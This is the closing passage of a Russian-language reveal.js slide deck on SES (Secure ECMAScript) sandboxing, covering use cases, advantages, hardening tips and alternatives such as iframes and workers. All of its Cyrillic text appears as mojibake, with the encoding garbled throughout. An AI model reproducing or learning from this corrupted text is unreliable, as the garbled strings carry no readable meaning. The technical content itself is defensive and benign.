            <h3 class="pros">‚úì –ü–æ–¥—Ö–æ–¥–∏—Ç –¥–ª—è:</h3>
            <ul style="font-size: 0.8em;">
              <li>–°–∏—Å—Ç–µ–º—ã –ø–ª–∞–≥–∏–Ω–æ–≤</li>
              <li>–í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–æ–≥–æ –∫–æ–¥–∞</li>
              <li>–ò–∑–æ–ª—è—Ü–∏—è —Å—Ç–æ—Ä–æ–Ω–Ω–∏—Ö –±–∏–±–ª–∏–æ—Ç–µ–∫</li>
              <li>–°–º–∞—Ä—Ç-–∫–æ–Ω—Ç—Ä–∞–∫—Ç—ã</li>
              <li>–ë–µ–∑–æ–ø–∞—Å–Ω—ã–µ REPL</li>
            </ul>
          </div>
          <div>
            <h3 class="cons">‚úó –ù–µ –ø–æ–¥—Ö–æ–¥–∏—Ç –¥–ª—è:</h3>
            <ul style="font-size: 0.8em;">
              <li>–í—ã—Å–æ–∫–æ–Ω–∞–≥—Ä—É–∂–µ–Ω–Ω—ã—Ö —Å–∏—Å—Ç–µ–º</li>
              <li>–ö–æ–≥–¥–∞ –Ω—É–∂–µ–Ω –ø–æ–ª–Ω—ã–π –¥–æ—Å—Ç—É–ø –∫ DOM</li>
              <li>Legacy –∫–æ–¥–∞ —Å dynamic eval</li>
              <li>–ö–æ–≥–¥–∞ –≤–∞–∂–Ω–∞ –º–∞–∫—Å–∏–º–∞–ª—å–Ω–∞—è –ø—Ä–æ–∏–∑–≤–æ–¥–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å</li>
            </ul>
          </div>
        </div>
      </section>

      <section>
        <h2>–ì–ª–∞–≤–Ω—ã–µ –ø—Ä–µ–∏–º—É—â–µ—Å—Ç–≤–∞</h2>
        <ul>
          <li class="pros">üõ°Ô∏è <strong>–°–∏–ª—å–Ω–∞—è –∏–∑–æ–ª—è—Ü–∏—è</strong> ‚Äî –ø–æ–ª–Ω—ã–π –∫–æ–Ω—Ç—Ä–æ–ª—å –Ω–∞–¥ –æ–∫—Ä—É–∂–µ–Ω–∏–µ–º</li>
          <li class="pros">üîí <strong>Immutable API</strong> ‚Äî –∑–∞—â–∏—Ç–∞ –æ—Ç –º–æ–¥–∏—Ñ–∏–∫–∞—Ü–∏–∏</li>
          <li class="pros">üåê <strong>–†–∞–±–æ—Ç–∞–µ—Ç –≤ –±—Ä–∞—É–∑–µ—Ä–µ</strong> ‚Äî –Ω–µ —Ç—Ä–µ–±—É–µ—Ç Node.js</li>
          <li class="pros">üì¶ <strong>–õ–µ–≥–∫–æ–≤–µ—Å–Ω–æ—Å—Ç—å</strong> ‚Äî –ø–æ —Å—Ä–∞–≤–Ω–µ–Ω–∏—é —Å iframe/workers</li>
          <li class="pros">üîÆ <strong>–ë—É–¥—É—â–µ–µ —Å—Ç–∞–Ω–¥–∞—Ä—Ç–∞</strong> ‚Äî –¥–≤–∏–∂–µ—Ç—Å—è –≤ TC39</li>
        </ul>
      </section>

      <section>
        <h2>–ü—Ä–∞–∫—Ç–∏—á–µ—Å–∫–∏–µ —Ä–µ–∫–æ–º–µ–Ω–¥–∞—Ü–∏–∏</h2>
        <ol>
          <li><strong>–í—Å–µ–≥–¥–∞ –≤—ã–∑—ã–≤–∞–π—Ç–µ lockdown()</strong> –ø–µ—Ä–µ–¥ –∑–∞–≥—Ä—É–∑–∫–æ–π –ø–ª–∞–≥–∏–Ω–æ–≤</li>
          <li><strong>–ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ harden()</strong> –¥–ª—è –≤—Å–µ—Ö API –æ–±—ä–µ–∫—Ç–æ–≤</li>
          <li><strong>–ü–µ—Ä–µ–∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ compartments</strong> –¥–ª—è –ø—Ä–æ–∏–∑–≤–æ–¥–∏—Ç–µ–ª—å–Ω–æ—Å—Ç–∏</li>
          <li><strong>–ö–æ–º–±–∏–Ω–∏—Ä—É–π—Ç–µ —Å CSP</strong> –¥–ª—è –∑–∞—â–∏—Ç—ã –≤ –≥–ª—É–±–∏–Ω—É</li>
          <li><strong>–¢–µ—Å—Ç–∏—Ä—É–π—Ç–µ –Ω–∞ —Ä–µ–∞–ª—å–Ω—ã—Ö –∞—Ç–∞–∫–∞—Ö</strong> ‚Äî –Ω–µ –ø–æ–ª–∞–≥–∞–π—Ç–µ—Å—å —Ç–æ–ª—å–∫–æ –Ω–∞ —Ç–µ–æ—Ä–∏—é</li>
        </ol>
      </section>

      <section>
        <h2>–ê–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤—ã –≤ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–∏ –æ—Ç —Å–ª—É—á–∞—è</h2>
        <table style="font-size: 0.7em;">
          <tr>
            <th>–°—Ü–µ–Ω–∞—Ä–∏–π</th>
            <th>–†–µ–∫–æ–º–µ–Ω–¥–∞—Ü–∏—è</th>
          </tr>
          <tr>
            <td>–ü–æ–ª–Ω–∞—è –∏–∑–æ–ª—è—Ü–∏—è + DOM</td>
            <td>Iframe Sandbox</td>
          </tr>
          <tr>
            <td>–¢—è–∂—ë–ª—ã–µ –≤—ã—á–∏—Å–ª–µ–Ω–∏—è</td>
            <td>Web Workers</td>
          </tr>
          <tr>
            <td>–ü—Ä–æ—Å—Ç—ã–µ –ø–ª–∞–≥–∏–Ω—ã</td>
            <td>SES Compartment</td>
          </tr>
          <tr>
            <td>Node.js –æ–∫—Ä—É–∂–µ–Ω–∏–µ</td>
            <td>Worker Threads + SES</td>
          </tr>
          <tr>
            <td>–ú–∞–∫—Å–∏–º–∞–ª—å–Ω–∞—è –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å</td>
            <td>–ò–∑–æ–ª–∏—Ä–æ–≤–∞–Ω–Ω—ã–π –ø—Ä–æ—Ü–µ—Å—Å</td>
          </tr>
        </table>
      </section>

      <!-- –ó–∞–∫–ª—é—á–∏—Ç–µ–ª—å–Ω—ã–π —Å–ª–∞–π–¥ -->
      <section class="center">
        <h1>–°–ø–∞—Å–∏–±–æ –∑–∞ –≤–Ω–∏–º–∞–Ω–∏–µ!</h1>
        <h3>SES: Secure ECMAScript</h3>
        <p>
          <small>
            üîó <a href="https://github.com/endojs/endo">github.com/endojs/endo</a><br>
            üìö <a href="https://ses.js.org">ses.js.org</a><br>
            üìñ <a href="https://github.com/tc39/proposal-ses">TC39 SES Proposal</a>
          </small>
        </p>
        <br>
        <p style="font-size: 0.8em;">
          <em>"–ë–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å ‚Äî —ç—Ç–æ –Ω–µ –ø—Ä–æ–¥—É–∫—Ç, –∞ –ø—Ä–æ—Ü–µ—Å—Å"</em><br>
          ‚Äî Bruce Schneier
        </p>
      </section>

    </div>
  </div>

  <script src="dist/reveal.js"></script>
  <script src="plugin/notes/notes.js"></script>
  <script src="plugin/markdown/markdown.js"></script>
  <script src="plugin/highlight/highlight.js"></script>
  <script>
    // More info about initialization & config:
    // - https://revealjs.com/initialization/
    // - https://revealjs.com/config/
    Reveal.initialize({
      hash: true,

      // Learn about plugins: https://revealjs.com/plugins/
      plugins: [RevealMarkdown, RevealHighlight, RevealNotes]
    });
  </script>
</body>

</html>
